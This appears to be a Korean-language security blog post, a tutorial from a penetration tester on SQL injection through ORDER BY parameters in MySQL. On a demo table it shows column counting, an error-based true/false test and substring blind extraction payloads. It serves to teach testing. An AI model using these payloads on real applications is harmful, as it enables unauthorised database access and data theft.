---
layout: post
title:  "SQL Injection - Order by"
tag:   Analysis
categories: Web
---


Title : SQL Injection in Order by

최근에 발견한 order by를 이용한 SQL Injection에 대해 설명하는 글이다.

실습 환경 : MySQL / Table : one 컬럼 : name, id

```SQL
mysql> select * from one;
+------+---------+
| name | id      |
+------+---------+
| park | persu   |
| kim  | chinnie |
| hong | nisam   |
| park | chang   |
| park | hyun    |
+------+---------+
```


#1. Order by 기초

order by 는 출력되는 컬럼을 정렬하는데 쓰이는 쿼리 이다. 문법은 아래와 같다.

* http://dev.mysql.com/doc/refman/5.7/en/order-by-optimization.html

```SQL
SELECT column_name, column_name
FROM table_name
ORDER BY column_name ASC|DESC, column_name ASC|DESC;
```

아래 쿼리 처럼 where 절과 함께 쓸 수 있으며 asc는 오름차순

```SQL
mysql> select * from one where name="park" order by id asc;
+------+-------+
| name | id    |
+------+-------+
| park | chang |
| park | hyun  |
| park | persu |
+------+-------+
```

desc는 내림차순으로 정의된다.

```SQL
mysql> select * from one where name="park" order by id desc;
+------+-------+
| name | id    |
+------+-------+
| park | persu |
| park | hyun  |
| park | chang |
+------+-------+
```

또한 컬럼명 뒤에 아무것도 넣지 않을 경우 오름차순 정렬이 된다.

```SQL
mysql> select * from one where name="park" order by id;
+------+-------+
| name | id    |
+------+-------+
| park | chang |
| park | hyun  |
| park | persu |
+------+-------+
```

Order by가 SQL Injection에서 가장 유용하게(개인적으로) 쓰이는 경우는 컬럼의 수를 확인하기 위함인데 방법은 아래와 같다.

```SQL
mysql> select * from one where name="park" order by 1;
+------+-------+
| name | id    |
+------+-------+
| park | persu |
| park | chang |
| park | hyun  |
+------+-------+

mysql> select * from one where name="park" order by 2;
+------+-------+
| name | id    |
+------+-------+
| park | chang |
| park | hyun  |
| park | persu |
+------+-------+

mysql> select * from one where name="park" order by 3;
ERROR 1054 (42S22): Unknown column '3' in 'order clause'
```

위 order by 에서는 컬럼명이 아닌 숫자를 넣었는데 이 숫자의 의미는 컬럼의 갯수이다.
현재 name, id 두 컬럼만 존재하기 때문에 "order by 2" 까지는 각 칼럼의 오름차순 기준으로 정렬된 모습이지만
"order by 3" 입력 시 에러가 나게 된다. 이유는 3번째 컬럼이 없기 때문이다.

#2 Attack Vector

실제 모의해킹을 하다 보면, 각 게시글이나 출력되는 데이터에 대해 정렬을 할 수 있는 기능들이 있다.
필자가 발견한 포인트는 "order by=id desc" 라고 적혀 있는 파라미터 부분이었다.
사실 웹 해킹을 조금이라도 해본 사람이라면, GET, POST 에서 BurpSuite를 이용해 파라미터를 유심히 본다면 충분히 찾아 낼 수 있는 부분이다.

#3 SQL Injection PoC

3.1 컬럼갯수 확인

order by=[숫자] 를 입력하여 컬럼갯수를 파악하였다. (10개쯤...)

3.2 쿼리 입력을 통한 참, 거짓 판별

이 부분이 실제로 화이트리스트 기반으로 정의된 입력 값만 받을 것인지, 필터링이 걸리지 않은 것인지 확인 할 수 있는 방법이다.
필자 같은 경우 아래와 같은 쿼리를 주로 넣어본다.

order by 절 이후 order by () 처럼 괄호안에 서브쿼리 입력이 가능하지만, 아래 쿼리들과 입력했을 경우에는 에러가 나는 경우를 확인할 수 있었다.

```SQL
mysql> select * from one order by (select 1);
+------+---------+
| name | id      |
+------+---------+
| park | persu   |
| kim  | chinnie |
| hong | nisam   |
| park | chang   |
| park | hyun    |
+------+---------+
5 rows in set (0.00 sec)

mysql> select * from one order by (select * from one);
ERROR 1241 (21000): Operand should contain 1 column(s)

mysql> select * from one order by (select name from one);
ERROR 1242 (21000): Subquery returns more than 1 row

mysql> select * from one order by (select 1 from one);
ERROR 1242 (21000): Subquery returns more than 1 row
```

이 원인을 찾기 위해 아래 블로그 참고 결과 order by는 단일행 결과만 입력이 가능하단 것을 알게되었다.

* http://n3015m.tistory.com/173

* 단일 행 서브 쿼리
서브 쿼리에서 여러 행이 검색되는 쿼리문.

```SQL
mysql> select 1;
+---+
| 1 |
+---+
| 1 |
+---+
```

* 다중 행 서브 쿼리
서브 쿼리에서 여러 행이 검색되는 쿼리문.

```SQL
mysql> select name from one;
+------+
| name |
+------+
| park |
| kim  |
| hong |
| park |
| park |
+------+
```

이를 잘 이용하면 Blind SQL Injection이 가능하며, 참과 거짓을 판단하기 위한 기본적인 쿼리는 아래와 같다.

#True 결과값
order by 내 서브 쿼리가 true가 되면 다중 쿼리를 출력하게 되므로, 해당 order by절은 에러를 발생하게 된다.

```SQL
mysql> select * from one order by (select name from one where 1=1);
ERROR 1242 (21000): Subquery returns more than 1 row

mysql> select name from one where 1=1;
+------+
| name |
+------+
| park |
| kim  |
| hong |
| park |
| park |
+------+
```

#False 결과값 리턴 (mysql에서 empty는 단일행으로 취급)
order by 내 서브 쿼리가 false가 되면 단일 쿼리를 출력하게 되므로, 해당 order by 절은 정상적으로 출력하게 된다.

```SQL
mysql> select * from one order by (select name from one where 1=2);
+------+---------+
| name | id      |
+------+---------+
| park | persu   |
| kim  | chinnie |
| hong | nisam   |
| park | chang   |
| park | hyun    |
+------+---------+

mysql> select name from one where 1=2;
Empty set (0.00 sec)
```

3.3 Blind SQL Injection으로 데이터 추출

점검 시 컬럼명, 테이블명을 알고 있는 상태여서 컬럼 내 데이터만 추출하면 되는 상황이었다.
사용한 쿼리는 아래와 같다.

```
mysql> select * from one order by (select 1 from one where (substring((select name from one limit 1),1,1)='a'));
+------+---------+
| name | id      |
+------+---------+
| park | persu   |
| kim  | chinnie |
| hong | nisam   |
| park | chang   |
| park | hyun    |
+------+---------+

mysql> select * from one order by (select 1 from one where (substring((select name from one limit 1),1,1)='p'));
ERROR 1242 (21000): Subquery returns more than 1 row
```

좀 더 위 쿼리를 분석하자면,

substring을 통해 one 테이블의 name 컬럼의 첫 번째 값의 첫 글자를 출력한다.

```SQL
mysql> select substring((select name from one limit 1),1,1);
+-----------------------------------------------+
| substring((select name from one limit 1),1,1) |
+-----------------------------------------------+
| p                                             |
+-----------------------------------------------+
1 row in set (0.00 sec)
```

이후 그 값이 p 가 맞다면, 1을 레코드 수에 맞게 출력하게 된다. (총 5번)

```SQL
mysql> select 1 from one where (select substring((select name from one limit 1),1,1)='p');
+---+
| 1 |
+---+
| 1 |
| 1 |
| 1 |
| 1 |
| 1 |
+---+
5 rows in set (0.00 sec)
```

p 값이 아닐 경우 false인 empty를 출력하기 때문에 order by 절에서 true로 표시된다.

```SQL
mysql> select 1 from one where (select substring((select name from one limit 1),1,1)='a');
Empty set (0.00 sec)
```

이렇게 다음 Blind SQL Injection을 통해 데이터를 출력 시킬 수 있었다.
order by를 통해 SQL Injection을 하기 위해 가장 중요한건
1. 파라미터를 통해 쿼리를 입력할 수 있는가?
2. 단일행, 다중행의 내용을 이해하고 있는지?
3. Blind SQL Injection을 할 수 있는가?

이정도가 아닐까 싶다. 이상입니다.
